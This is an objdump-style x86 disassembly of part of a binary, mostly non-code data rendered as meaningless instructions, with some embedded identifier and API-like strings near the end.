  4232b8:	xlat   BYTE PTR ds:[ebx]
  4232b9:	lds    ecx,FWORD PTR [esp+esi*1+0x42979032]
  4232c0:	lds    ebp,FWORD PTR [edx]
  4232c2:	sub    edx,esp
  4232c4:	test   al,0x7b
  4232c6:	rol    BYTE PTR [ebp-0x33],0x9f
  4232ca:	cmp    BYTE PTR [esi],cl
  4232cc:	bound  eax,QWORD PTR [edi+0x46e236b2]
  4232d2:	std    
  4232d3:	cwde   
  4232d4:	xchg   esi,eax
  4232d5:	repnz mov al,ds:0xfbb77826
  4232db:	lds    edx,FWORD PTR [ebx+0x2a]
  4232de:	mov    esi,0xde15970c
  4232e3:	adc    BYTE PTR [ebx+edi*2+0x6a4b48d7],al
  4232ea:	fisub  DWORD PTR [edx+0x60]
  4232ed:	xchg   edi,eax
  4232ee:	cdq    
  4232ef:	ins    BYTE PTR es:[edi],dx
  4232f0:	fwait
  4232f1:	test   eax,0xd85fd8e7
  4232f6:	jge    0x42328c
  4232f8:	push   esp
  4232f9:	jl     0x423360
  4232fb:	cli    
  4232fc:	frstor [edi-0x6c]
  4232ff:	add    esp,DWORD PTR [edx-0x10266456]
  423305:	and    BYTE PTR [ecx],bl
  423307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423308:	inc    esp
  423309:	fucomi st,st(1)
  42330b:	add    ebp,DWORD PTR [edx+0x2c83a6a7]
  423311:	out    dx,eax
  423312:	nop    DWORD PTR [edx-0xc]
  423316:	lds    esi,FWORD PTR [edi+0x3f]
  423319:	xchg   esp,eax
  42331a:	out    dx,eax
  42331b:	jge    0x4232c8
  42331d:	mov    bl,0x8c
  42331f:	and    DWORD PTR ds:0x557674c,edx
  423325:	test   dh,0x7b
  423328:	aaa    
  423329:	ret    0x220f
  42332c:	sub    dh,bl
  42332e:	in     eax,dx
  42332f:	push   es
  423330:	cmp    BYTE PTR [edi+0x6e61daeb],al
  423336:	mov    al,BYTE PTR [ecx]
  423338:	jmp    0x423342
  42333a:	(bad)  
  42333b:	mov    ?,WORD PTR [esi+0x2b1a2f66]
  423341:	sub    bh,BYTE PTR [edx+edx*1-0x5b2d7a60]
  423348:	into   
  423349:	out    0xea,al
  42334b:	std    
  42334c:	scas   al,BYTE PTR es:[edi]
  42334d:	push   edi
  42334e:	jns    0x42339e
  423350:	jmp    0xaaf5d20f
  423355:	cmp    eax,0x212c47d6
  42335a:	adc    al,0x32
  42335c:	jb     0x42338f
  42335e:	xor    ch,al
  423360:	mov    edi,DWORD PTR [eax-0x1a]
  423363:	fnstcw WORD PTR [edi]
  423365:	cmp    DWORD PTR [edi-0x77],ebp
  423368:	loopne 0x4233ad
	...
  423376:	add    BYTE PTR [edx-0x4d],bh
  423379:	and    dh,cl
  42337b:	jmp    0x78fa325f
  423380:	cmp    DWORD PTR [ecx-0x5f],ecx
  423383:	xor    ah,BYTE PTR [ecx]
  423385:	stc    
  423386:	xchg   ecx,eax
  423387:	xchg   esp,eax
  423388:	aam    0x1
  42338a:	add    BYTE PTR [ebx],ch
  42338c:	add    al,BYTE PTR [eax]
  42338e:	add    bh,ch
  423390:	mov    bh,0x53
  423392:	add    BYTE PTR [ebp+0x50c58b90],ch
  423398:	jnp    0x423396
  42339a:	xor    ebp,esp
  42339c:	(bad)  
  42339d:	into   
  42339e:	sbb    BYTE PTR [edx-0x38],dl
  4233a1:	fld    QWORD PTR [esi+0x2ffd92b3]
  4233a7:	inc    edx
  4233a8:	cli    
  4233a9:	sub    eax,0xbf795b57
  4233ae:	dec    edx
  4233af:	ja     0x4233b4
  4233b1:	std    
  4233b2:	cwde   
  4233b3:	xchg   edx,eax
  4233b4:	jmp    0x7436:0x33ad7378
  4233bb:	jge    0x4233f0
  4233bd:	int3   
  4233be:	pop    eax
  4233bf:	push   ds
  4233c0:	retf   0xe810
  4233c3:	jmp    0x18a:0xb1e8c7bf
  4233ca:	sbb    DWORD PTR es:[ebx+0x6e],edi
  4233ce:	inc    eax
  4233cf:	jmp    0xd542:0x1722fcff
  4233d6:	push   ecx
  4233d7:	add    cl,BYTE PTR [ecx]
  4233d9:	pop    eax
  4233da:	dec    edi
  4233db:	or     eax,0x1b8adfe3
  4233e0:	in     eax,0xd4
  4233e2:	rcl    cl,0x17
  4233e5:	fimul  DWORD PTR [edx-0x4c]
  4233e8:	dec    edx
  4233e9:	mov    cl,0x2
  4233eb:	and    cl,BYTE PTR [ebp-0x7d]
  4233ee:	adc    edi,DWORD PTR [edx]
  4233f0:	je     0x423469
  4233f2:	xor    eax,0x364ae175
  4233f7:	enter  0x6251,0x9f
  4233fb:	(bad)  
  4233fc:	sub    DWORD PTR [eax],esp
  4233fe:	std    
  4233ff:	mov    cl,BYTE PTR [ebp-0x2f]
  423402:	shl    BYTE PTR [eax-0x34496675],0xd9
  423409:	jle    0x42344c
  42340b:	imul   ebx,DWORD PTR [edi+0x44fa7659],0xaae8cb47
  423415:	loope  0x4233e4
  423417:	dec    esp
  423418:	loopne 0x4233e9
  42341a:	push   ebp
  42341b:	jmp    0x3d8d:0x2463e41a
  423422:	sbb    al,0xd5
  423424:	mov    edx,ecx
  423426:	test   BYTE PTR [edi+ebp*1-0x36],al
  42342a:	or     DWORD PTR [edx+0x8bfb3fb],ecx
  423430:	dec    ebx
  423431:	xchg   ebp,eax
  423432:	sbb    eax,0x197ed9eb
  423437:	icebp  
  423438:	xor    al,0x7
  42343a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42343b:	(bad)  
  42343c:	cdq    
  42343d:	mov    esp,0xfb721d66
  423442:	fwait
  423443:	(bad)  
  423444:	(bad)  
  423446:	shl    dl,1
  423448:	fistp  DWORD PTR [ebp+0x479f555c]
  42344e:	pop    eax
  42344f:	mov    ds:0x2130282c,al
  423454:	loop   0x42346c
  423456:	cdq    
  423457:	and    al,0x6b
  423459:	push   edi
  42345a:	xchg   esp,eax
  42345b:	xor    ah,BYTE PTR [edi]
  42345d:	ins    DWORD PTR es:[edi],dx
  42345e:	sub    eax,0xfea60948
  423463:	retf   
  423464:	(bad)  
  423465:	dec    eax
  423466:	jg     0x423485
  423468:	das    
  423469:	pop    esi
  42346a:	adc    DWORD PTR [eax+ebx*2-0x404e9a4d],ebx
  423471:	scas   al,BYTE PTR es:[edi]
  423472:	mov    dh,BYTE PTR [ebp+0x6f]
  423475:	cmp    al,0xeb
  423477:	rcr    BYTE PTR [eax+esi*8-0xd9c217b],1
  42347e:	dec    esi
  42347f:	adc    BYTE PTR [esi+eiz*4+0x412d12e6],ah
  423486:	lahf   
  423487:	cmp    BYTE PTR [ebx],ch
  423489:	adc    BYTE PTR [ebx],dl
  42348b:	pusha  
  42348c:	les    esp,FWORD PTR [eax]
  42348e:	cmc    
  42348f:	jns    0x4234bd
  423491:	pushf  
  423492:	mov    ecx,0x4b6ad39d
  423497:	jmp    0x42348a
  423499:	ins    DWORD PTR es:[edi],dx
  42349a:	sar    DWORD PTR [ebp+ebp*4+0x259bb425],0x43
  4234a2:	sahf   
  4234a3:	jg     0x423431
  4234a5:	push   eax
  4234a6:	pop    ebp
  4234a7:	inc    ebx
  4234a8:	out    dx,eax
  4234a9:	mov    al,0x93
  4234ab:	adc    al,0xba
  4234ad:	mov    BYTE PTR [ebx-0x4c99627b],dh
  4234b3:	pusha  
  4234b4:	xor    bl,BYTE PTR [ebx]
  4234b6:	xchg   esp,eax
  4234b7:	loope  0x42343b
  4234b9:	push   esp
  4234ba:	cs das 
  4234bc:	xchg   esp,eax
  4234bd:	lea    esp,[edi+0x7f]
  4234c0:	mov    ds,eax
  4234c2:	inc    esi
  4234c3:	cmp    BYTE PTR [edi],cl
  4234c5:	inc    ecx
  4234c6:	jg     0x4234a8
  4234c8:	pop    edi
  4234c9:	popf   
  4234ca:	mov    bl,ah
  4234cc:	rol    BYTE PTR [ebx+0x73],1
  4234cf:	sub    eax,ebx
  4234d1:	mov    ds:0xa55dbb2b,eax
  4234d6:	jae    0x4234b1
  4234d8:	add    esi,DWORD PTR [edx+0x660baaff]
  4234de:	mov    ch,BYTE PTR [ebx-0x25]
  4234e1:	(bad)  
  4234e2:	adc    DWORD PTR [ebp+0x7bbddece],eax
  4234e8:	enter  0xb556,0x26
  4234ec:	dec    edx
  4234ed:	mov    bl,0x69
  4234ef:	(bad)  
  4234f0:	aam    0xea
  4234f2:	add    al,0xee
  4234f4:	loopne 0x4234a7
  4234f6:	cli    
  4234f7:	enter  0x916d,0x6d
  4234fb:	mov    esi,0x924ea12f
  423500:	xor    al,0x67
  423502:	push   edx
  423503:	mov    bh,BYTE PTR ss:[ebx]
  423506:	sub    bl,BYTE PTR [ecx]
  423508:	mov    ds:0x9f1c3fae,eax
  42350d:	dec    esi
  42350e:	lods   al,BYTE PTR ds:[esi]
  42350f:	popa   
  423510:	into   
  423511:	xor    bl,ah
  423513:	out    dx,al
  423514:	mov    ds,ebp
  423516:	cld    
  423517:	pusha  
  423518:	rol    DWORD PTR [edx],1
  42351a:	out    0x91,eax
  42351c:	jp     0x4234f2
  42351e:	pop    ds
  42351f:	outs   dx,BYTE PTR ds:[esi]
  423520:	pop    ebx
  423521:	inc    ecx
  423522:	inc    esi
  423523:	pop    es
  423524:	(bad)  
  423525:	push   ebp
  423526:	xchg   edi,eax
  423527:	inc    ecx
  423528:	jno    0x423536
  42352a:	and    eax,0x8c91d68a
  42352f:	clc    
  423530:	push   edx
  423531:	pop    ds
  423532:	jmp    DWORD PTR [eax-0x61]
  423535:	adc    esp,DWORD PTR [esi+0x19a4ff9]
  42353b:	test   eax,0x6d3b554a
  423540:	dec    esi
  423541:	(bad)  
  423542:	pop    es
  423543:	ficomp DWORD PTR [edi+0x48809b98]
  423549:	cmp    eax,0x405a3025
  42354e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  423550:	gs (bad) 
  423552:	aas    
  423553:	lods   eax,DWORD PTR ds:[esi]
  423554:	pop    esi
  423555:	out    0x7c,al
  423557:	mov    dh,0xa7
  423559:	in     eax,dx
  42355a:	scas   eax,DWORD PTR es:[edi]
  42355b:	or     eax,0x5f56522b
  423560:	fdivr  st(7),st
  423562:	addr16 inc esi
  423564:	and    dl,cl
  423566:	fs js  0x42351a
  423569:	dec    ecx
  42356a:	push   ebp
  42356b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42356c:	ds add eax,edi
  42356f:	xor    al,0xfc
  423571:	sub    esi,ebx
  423573:	in     eax,dx
  423574:	add    al,0x2d
  423576:	and    cl,BYTE PTR [ecx]
  423578:	inc    ebx
  423579:	add    eax,0x514db19d
  42357e:	idiv   BYTE PTR [eax]
  423580:	or     ah,ah
  423582:	xor    BYTE PTR [eax],0x1f
  423585:	ja     0x4235ab
  423587:	scas   al,BYTE PTR es:[edi]
  423588:	outs   dx,BYTE PTR ds:[esi]
  423589:	mov    ah,0x16
  42358b:	out    dx,eax
  42358c:	shl    BYTE PTR [ecx-0x26],cl
  42358f:	ds sahf 
  423591:	mov    eax,ebp
  423593:	fcmove st,st(4)
  423595:	imul   edx,DWORD PTR [ebp-0x1d52f699],0x43
  42359c:	fdiv   st,st(4)
  42359e:	in     al,0x4a
  4235a0:	jle    0x7ed2154d
  4235a6:	mov    BYTE PTR [ebx+ebp*1],0xe4
  4235aa:	popf   
  4235ab:	addr16 mov dl,0x62
  4235ae:	mov    cl,0x89
  4235b1:	aaa    
  4235b2:	nop
  4235b3:	and    eax,0xc0f57a23
  4235b8:	(bad)  
  4235b9:	xchg   ebp,eax
	...
  4235c6:	add    BYTE PTR [edx],bl
  4235c8:	icebp  
  4235c9:	test   DWORD PTR [esi-0x2847901],0x9f2c1e8a
  4235d3:	and    al,0xaa
  4235d5:	daa    
  4235d6:	mov    eax,0x1d6bf
  4235db:	sub    eax,DWORD PTR [edx]
  4235dd:	add    BYTE PTR [eax],al
  4235df:	push   cs
  4235e0:	cmp    eax,0xe30d32fb
  4235e5:	jns    0x423647
  4235e7:	mov    DWORD PTR [ebx-0x5a679ff0],0xf687bd2c
  4235f1:	adc    BYTE PTR [esi+0x45],0x5f
  4235f5:	cmp    cl,bh
  4235f7:	sbb    cl,BYTE PTR cs:[edx-0x72ed38f]
  4235fe:	dec    ebp
  4235ff:	xchg   BYTE PTR [ebp+0x36],ch
  423602:	or     eax,0x22cb214f
  423607:	stos   DWORD PTR es:[edi],eax
  423608:	enter  0xc738,0x6b
  42360c:	stos   DWORD PTR es:[edi],eax
  42360d:	dec    ebp
  42360e:	inc    esi
  42360f:	xchg   DWORD PTR [ebp+0x2578ee83],esi
  423615:	lods   al,BYTE PTR cs:[esi]
  423617:	lods   eax,DWORD PTR ds:[esi]
  423618:	out    0xd8,eax
  42361a:	inc    dx
  42361c:	jb     0x423615
  42361e:	mov    ds:0xae3c45dc,al
  423623:	lea    ebp,[eax+0x72]
  423626:	mov    eax,ds:0x7045b891
  42362b:	jmp    0xcc52:0xc639fba1
  423632:	inc    ebx
  423633:	mov    ebx,0xe492d295
  423638:	in     al,0xcb
  42363a:	add    DWORD PTR [ebx-0x58],edi
  42363d:	(bad)  
  42363e:	mov    ds:0x521f8eb9,al
  423643:	test   ah,cl
  423645:	aad    0xc1
  423647:	jnp    0x4236c6
  423649:	dec    eax
  42364a:	lds    esi,FWORD PTR [edx+0x17]
  42364d:	push   es
  42364e:	add    dh,bh
  423650:	or     esp,DWORD PTR [ebp-0x65866bd8]
  423656:	push   0xfdce5c18
  42365b:	(bad)  
  42365c:	mov    edx,0xe9e2de2
  423661:	pushf  
  423662:	(bad)  
  423663:	test   al,0x3a
  423665:	and    ebx,esp
  423667:	lods   eax,DWORD PTR ds:[esi]
  423668:	dec    edi
  423669:	sbb    DWORD PTR [ecx+0x4c],esi
  42366c:	jo     0x42365c
  42366e:	(bad)  
  42366f:	adc    al,0x29
  423671:	jecxz  0x42360f
  423673:	cli    
  423674:	dec    ebx
  423675:	stos   BYTE PTR es:[edi],al
  423676:	pusha  
  423677:	and    ebp,edi
  423679:	push   0xabc47439
  42367e:	adc    ecx,esi
  423680:	pushf  
  423681:	enter  0x11e7,0x15
  423685:	adc    eax,0x8c9b739a
  42368a:	inc    eax
  42368b:	retf   0x7fe5
  42368e:	sub    al,ah
  423690:	out    0x50,eax
  423692:	test   BYTE PTR [esi+0x7dfb6214],0x51
  423699:	sbb    al,0x85
  42369b:	mov    dl,0x6
  42369d:	ret    
  42369e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42369f:	or     eax,0xdb29d276
  4236a4:	or     ch,BYTE PTR [ebx+0x2bfa4cb7]
  4236aa:	mov    cs,WORD PTR [edx+0x4c]
  4236ad:	fsubr  QWORD PTR [ecx]
  4236af:	jne    0x4236fd
  4236b1:	xlat   BYTE PTR ds:[ebx]
  4236b2:	fs in  eax,dx
  4236b4:	(bad)  
  4236b5:	sub    esi,DWORD PTR [ecx-0x37224d54]
  4236bb:	imul   ebp,DWORD PTR [ecx+0x4d],0xffffff98
  4236bf:	dec    edi
  4236c0:	fwait
  4236c1:	mov    esi,0x75c9491
  4236c6:	test   eax,0xd61531f9
  4236cb:	add    BYTE PTR [edx],ah
  4236cd:	aam    0xe6
  4236cf:	dec    esp
  4236d0:	iret   
  4236d1:	xchg   ebp,ebx
  4236d3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4236d5:	stos   WORD PTR es:[edi],ax
  4236d7:	sub    al,BYTE PTR [eax+0x60636362]
  4236dd:	retf   0xa9fe
  4236e0:	pushf  
  4236e1:	icebp  
  4236e2:	shl    dl,1
  4236e4:	push   ecx
  4236e5:	mov    dl,0x59
  4236e7:	stos   DWORD PTR es:[edi],eax
  4236e8:	lock sti 
  4236ea:	push   0xd479370c
  4236ef:	sbb    eax,0x355133e6
  4236f4:	mov    al,0x68
  4236f6:	add    DWORD PTR [esi+0x2edf005e],esp
  4236fc:	mov    ecx,0xaa579e6e
  423701:	dec    edi
  423702:	pop    edx
  423703:	push   cs
  423704:	sub    eax,0x81754b96
  423709:	push   ds
  42370a:	xchg   esi,eax
  42370b:	jl     0x423720
  42370d:	fldenv [edx]
  42370f:	shl    DWORD PTR [edi-0x7cdc0d99],cl
  423715:	(bad)  [edi]
  423717:	push   ebx
  423718:	outs   dx,BYTE PTR ds:[esi]
  423719:	xchg   ecx,eax
  42371a:	sub    al,0xa6
  42371c:	pusha  
  42371d:	(bad)  
  42371e:	xlat   BYTE PTR ds:[ebx]
  42371f:	(bad)  
  423720:	shr    BYTE PTR [edx-0x4521efc2],cl
  423726:	mov    dl,0xdd
  423728:	js     0x423735
  42372a:	lds    esp,FWORD PTR [ebx-0x3b9a346b]
  423730:	jae    0x423719
  423732:	xor    dl,ah
  423734:	sub    DWORD PTR [eax+0x1d],esi
  423737:	xchg   BYTE PTR [esi+0x76d053be],cl
  42373d:	hlt    
  42373e:	mov    esp,0xc421fcdc
  423743:	out    0x5d,al
  423745:	(bad)  
  423746:	loope  0x4236ff
  423748:	iret   
  423749:	mov    dh,0x5d
  42374b:	cmp    WORD PTR gs:[esi+ebp*1+0x52d23840],ax
  423754:	or     ah,BYTE PTR [ebp-0xe]
  423757:	(bad)  
  423758:	cli    
  423759:	mov    ch,0x9e
  42375b:	rol    BYTE PTR [ecx+0x31ae00fd],1
  423761:	jge    0x4236fe
  423763:	xchg   edx,eax
  423764:	xchg   ebp,eax
  423765:	(bad)  
  423766:	push   0xb934d7f8
  42376b:	and    eax,0x730f9d2d
  423770:	pop    esp
  423771:	pop    eax
  423772:	push   cs
  423773:	xchg   edi,eax
  423774:	in     eax,dx
  423775:	(bad)  
  423776:	nop
  423777:	mov    ebx,0xcc2fdfc0
  42377c:	(bad)  
  42377e:	shl    edi,1
  423780:	inc    eax
  423781:	add    eax,0x14b7605e
  423786:	and    ch,BYTE PTR [edx+0x68]
  423789:	pop    ebx
  42378a:	xchg   BYTE PTR [ebx],dh
  42378c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42378e:	jge    0x423737
  423790:	outs   dx,BYTE PTR ds:[esi]
  423791:	das    
  423792:	aas    
  423793:	and    eax,0xd5086ad8
  423798:	dec    eax
  423799:	idiv   DWORD PTR [edx-0x29]
  42379c:	push   esp
  42379d:	pop    eax
  42379e:	(bad)  
  42379f:	jbe    0x423769
  4237a1:	cdq    
  4237a2:	retf   0x908b
  4237a5:	xchg   esp,eax
  4237a6:	fstp   QWORD PTR [ebx-0x4d]
  4237a9:	push   edi
  4237aa:	xor    eax,0x35187618
  4237af:	ds mov esi,0xae084654
  4237b5:	mov    edi,0x9367c103
  4237ba:	cdq    
  4237bb:	sub    BYTE PTR [esi],bl
  4237bd:	add    eax,0xadba5c54
  4237c2:	jge    0x42383c
  4237c4:	sub    esp,esi
  4237c6:	xchg   ebx,eax
  4237c7:	inc    edi
  4237c8:	out    0xa4,eax
  4237ca:	dec    esp
  4237cb:	lahf   
  4237cc:	xchg   DWORD PTR [esi-0x17f568cf],ecx
  4237d2:	jne    0x4237d6
  4237d4:	cs pop edx
  4237d6:	mov    cl,0xdc
  4237d8:	push   ebp
  4237d9:	aas    
  4237da:	sbb    eax,0xb6c09be3
  4237df:	or     cl,BYTE PTR [edx+ebp*1]
  4237e2:	inc    esi
  4237e3:	lock inc edi
  4237e5:	pop    esi
  4237e6:	push   edi
  4237e7:	test   BYTE PTR [edi+0x649b23c0],0x8a
  4237ee:	data16 dec bx
  4237f1:	dec    BYTE PTR [ecx+eax*1-0x19]
  4237f5:	ret    
  4237f6:	popf   
  4237f7:	lods   al,BYTE PTR ds:[esi]
  4237f8:	mov    ch,0xed
  4237fa:	into   
  4237fb:	add    DWORD PTR [ebx+ebx*4-0xe2ea131],esi
  423802:	cdq    
  423803:	(bad)  
  423804:	mov    edx,0xb3652328
	...
  423816:	add    BYTE PTR [eax],al
  423818:	and    BYTE PTR [ebx+0x0],al
  42381b:	add    al,0x20
  42381d:	inc    ebx
  42381e:	add    BYTE PTR [eax],cl
  423820:	and    BYTE PTR [ebx+0x0],al
  423823:	or     al,0x20
  423825:	inc    ebx
  423826:	add    BYTE PTR [eax],dl
  423828:	and    BYTE PTR [ebx+0x0],al
  42382b:	adc    al,0x20
  42382d:	inc    ebx
  42382e:	add    BYTE PTR [eax],bl
  423830:	and    BYTE PTR [ebx+0x0],al
  423833:	sbb    al,0x20
  423835:	inc    ebx
  423836:	add    BYTE PTR [ebp+0x35],al
  423839:	xor    bl,BYTE PTR [edi+0x43]
  42383c:	cmp    BYTE PTR [edi+esi*1],dh
  42383f:	pop    edi
  423840:	xor    BYTE PTR [edx*2+0x454f0039],dh
  423847:	xor    BYTE PTR [edi+0x4a],bl
  42384a:	push   ecx
  42384b:	dec    edx
  42384c:	push   ebp
  42384d:	xor    cl,BYTE PTR [ebx+0x0]
  423850:	push   ebx
  423851:	inc    edi
  423852:	inc    edi
  423853:	pop    edi
  423854:	inc    edx
  423855:	inc    esi
  423856:	push   ebp
  423857:	xor    ebx,DWORD PTR [edi+0x4c]
  42385a:	dec    esi
  42385b:	push   eax
  42385c:	pop    edi
  42385d:	pop    edx
  42385e:	add    BYTE PTR [ebp+0x57],dl
  423861:	xor    al,0x5f
  423863:	xor    BYTE PTR [ebx+0x52],al
  423866:	pop    edi
  423867:	push   edx
  423868:	inc    ecx
  423869:	xor    dh,BYTE PTR [edx]
  42386b:	pop    edi
  42386c:	dec    ebp
  42386d:	add    BYTE PTR [esp+esi*1+0x30],al
  423871:	pop    edi
  423872:	xor    BYTE PTR [edi+0x37],cl
  423875:	inc    ecx
  423876:	push   eax
  423877:	dec    esp
  423878:	add    BYTE PTR [eax+0x38],dl
  42387b:	aaa    
  42387c:	pop    edi
  42387d:	aaa    
  42387e:	dec    ecx
  42387f:	cmp    BYTE PTR [esi+0x39],al
  423882:	xor    BYTE PTR [ebx+0x0],cl
  423885:	dec    edi
  423886:	push   ebx
  423887:	dec    esp
  423888:	pop    edi
  423889:	inc    edx
  42388a:	xor    BYTE PTR [ecx],dh
  42388c:	pop    edi
  42388d:	dec    ebx
  42388e:	xor    eax,0x33395452
  423893:	add    BYTE PTR [ecx+0x42],bl
  423896:	cmp    DWORD PTR [edi+0x45],ebx
  423899:	inc    esp
  42389a:	xor    cl,BYTE PTR [edi+ebx*2+0x46]
  42389e:	xor    eax,0x4e005857
  4238a3:	xor    DWORD PTR [esi+0x39],ecx
  4238a6:	aaa    
  4238a7:	pop    edi
  4238a8:	pop    ecx
  4238a9:	aaa    
  4238aa:	push   ebp
  4238ab:	add    BYTE PTR ss:[eax+0x4f],cl
  4238af:	aaa    
  4238b0:	pop    edi
  4238b1:	pop    edx
  4238b2:	push   edi
  4238b3:	ss pop edi
  4238b5:	push   ebx
  4238b6:	push   edi
  4238b7:	xor    eax,0x4e004146
  4238bc:	inc    ebp
  4238bd:	dec    esp
  4238be:	xor    al,0x5f
  4238c0:	dec    ecx
  4238c1:	pop    edx
  4238c2:	push   ebx
  4238c3:	inc    ecx
  4238c4:	pop    edi
  4238c5:	dec    edx
  4238c6:	xor    ecx,DWORD PTR [ecx+0x0]
  4238c9:	pop    edx
  4238ca:	dec    ebp
  4238cb:	xor    eax,0x5350395f
  4238d0:	pop    edi
  4238d1:	push   ecx
  4238d2:	inc    ebx
  4238d3:	dec    esi
  4238d4:	push   eax
  4238d5:	add    BYTE PTR [edi+0x47],dl
  4238d8:	ss pop edi
  4238da:	push   ebp
  4238db:	inc    edx
  4238dc:	push   ebp
  4238dd:	aaa    
  4238de:	dec    ecx
  4238df:	pop    edi
  4238e0:	aaa    
  4238e1:	inc    esp
  4238e2:	add    BYTE PTR [edx+0x0],al
  4238e5:	cmp    DWORD PTR [eax],eax
  4238e7:	xor    DWORD PTR [eax],eax
  4238e9:	xor    eax,0x5f003600
  4238ee:	add    BYTE PTR [ecx+0x0],bl
  4238f1:	cmp    BYTE PTR [eax],al
  4238f3:	inc    ecx
  4238f4:	add    BYTE PTR [eax+0x0],dl
  4238f7:	dec    esi
  4238f8:	add    BYTE PTR [eax],al
  4238fa:	add    BYTE PTR [edi+0x0],al
  4238fd:	dec    esp
  4238fe:	add    BYTE PTR [esi+0x0],cl
  423901:	xor    eax,DWORD PTR [eax]
  423903:	pop    edi
  423904:	add    BYTE PTR [ecx],bh
  423906:	add    BYTE PTR [eax+eax*1+0x4b],cl
  42390a:	add    BYTE PTR [edi+0x0],bl
  42390d:	dec    edx
  42390e:	add    BYTE PTR [ecx+0x0],al
  423911:	add    BYTE PTR [eax],al
  423913:	dec    edi
  423914:	add    BYTE PTR [eax+eax*1],dh
  423917:	dec    edx
  423918:	add    BYTE PTR [edi+0x0],bl
  42391b:	inc    edi
  42391c:	add    BYTE PTR [ecx],bh
  42391e:	add    BYTE PTR [edx],dh
  423920:	add    BYTE PTR [ebx],dh
  423922:	add    BYTE PTR [eax+eax*1+0x0],cl
  423926:	add    BYTE PTR [eax+eax*1+0x56],cl
  42392a:	add    BYTE PTR [edx+0x0],al
  42392d:	pop    edi
  42392e:	add    BYTE PTR [ecx+0x0],dl
  423931:	inc    ebp
  423932:	add    BYTE PTR [edx+0x0],al
  423935:	pop    edi
  423936:	add    BYTE PTR [edi+0x0],dl
  423939:	xor    al,0x0
  42393b:	inc    ecx
  42393c:	add    BYTE PTR [ecx],dh
  42393e:	add    BYTE PTR [edi+0x0],bl
  423941:	add    BYTE PTR ss:[edx+0x0],bl
  423945:	add    BYTE PTR [eax],al
  423947:	inc    esp
  423948:	add    BYTE PTR [eax],dh
  42394a:	add    BYTE PTR [esi+0x0],dl
  42394d:	cmp    BYTE PTR [eax],al
  42394f:	pop    edi
  423950:	add    BYTE PTR [eax+eax*1+0x4e],cl
  423954:	add    BYTE PTR [edi+0x0],dl
  423957:	xor    BYTE PTR [eax],al
  423959:	pop    edi
  42395a:	add    BYTE PTR [ebp+0x0],dl
  42395d:	inc    ebx
  42395e:	add    BYTE PTR [eax],al
  423960:	add    BYTE PTR [ecx+0x0],al
  423963:	pop    ecx
  423964:	add    BYTE PTR [ebp+0x0],dl
  423967:	pop    edi
  423968:	add    BYTE PTR [ecx],dh
  42396a:	add    BYTE PTR [eax],dh
  42396c:	add    BYTE PTR [esi+0x0],dl
  42396f:	cmp    DWORD PTR [eax],eax
  423971:	pop    edi
  423972:	add    BYTE PTR [edi+0x0],dl
  423975:	xor    al,0x0
  423977:	add    BYTE PTR [eax],al
  423979:	pop    eax
  42397a:	add    BYTE PTR [eax+eax*1+0x4a],al
  42397e:	add    BYTE PTR [ebx+0x0],cl
  423981:	add    BYTE PTR [eax],al
  423983:	add    al,ah
  423985:	inc    edx
  423986:	add    BYTE PTR [eax+eiz*8],al
  423989:	inc    edx
  42398a:	add    BYTE PTR [eax],cl
  42398c:	loopne 0x4239d0
  42398e:	add    BYTE PTR [eax+eiz*8],cl
  423991:	inc    edx
  423992:	add    BYTE PTR [eax],dl
  423994:	loopne 0x4239d8
  423996:	add    BYTE PTR [eax+eiz*8],dl
  423999:	inc    edx
  42399a:	add    BYTE PTR [eax],bl
  42399c:	loopne 0x4239e0
  42399e:	add    BYTE PTR [eax+eiz*8],bl
  4239a1:	inc    edx
  4239a2:	add    BYTE PTR [eax],ah
  4239a4:	loopne 0x4239e8
  4239a6:	add    BYTE PTR [eax+eiz*8],ah
  4239a9:	inc    edx
  4239aa:	add    BYTE PTR [eax],ch
  4239ac:	loopne 0x4239f0
  4239ae:	add    BYTE PTR [eax],al
  4239b0:	add    BYTE PTR [eax],al
  4239b2:	add    BYTE PTR [eax],al
  4239b4:	jnp    0x4239ea
  4239b6:	push   ebp
  4239b7:	dec    ebp
  4239b8:	add    BYTE PTR [eax],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	loop   0x4239f7
  4239be:	add    al,BYTE PTR [eax]
  4239c0:	add    DWORD PTR [eax],eax
  4239c2:	add    BYTE PTR [eax],al
  4239c4:	add    DWORD PTR [eax],eax
  4239c6:	add    BYTE PTR [eax],al
  4239c8:	add    DWORD PTR [eax],eax
  4239ca:	add    BYTE PTR [eax],al
  4239cc:	fdivr  DWORD PTR [ecx]
  4239ce:	add    al,BYTE PTR [eax]
  4239d0:	fdivr  QWORD PTR [ecx]
  4239d2:	add    al,BYTE PTR [eax]
  4239d4:	loopne 0x423a0f
  4239d6:	add    al,BYTE PTR [eax]
  4239d8:	jb     0x423a3d
  4239da:	add    BYTE PTR [eax],al
  4239dc:	out    dx,al
  4239dd:	cmp    DWORD PTR [edx],eax
  4239df:	add    BYTE PTR [eax],al
  4239e1:	add    BYTE PTR [ebp+0x78],al
  4239e4:	arpl   WORD PTR [ebp+0x6c],sp
  4239e7:	push   edi
  4239e8:	imul   ebp,DWORD PTR [esi+0x41],0x3f007070
  4239ef:	dec    edi
  4239f0:	jo     0x423a57
  4239f2:	outs   dx,BYTE PTR ds:[esi]
  4239f3:	push   edi
  4239f4:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4239fb:	popa   
  4239fc:	je     0x423a67
  4239fe:	outs   dx,DWORD PTR ds:[esi]
  4239ff:	outs   dx,BYTE PTR ds:[esi]
  423a00:	dec    edi
  423a01:	jo     0x423a68
  423a03:	outs   dx,BYTE PTR ds:[esi]
  423a04:	push   edi
  423a05:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423a0c:	popa   
	...
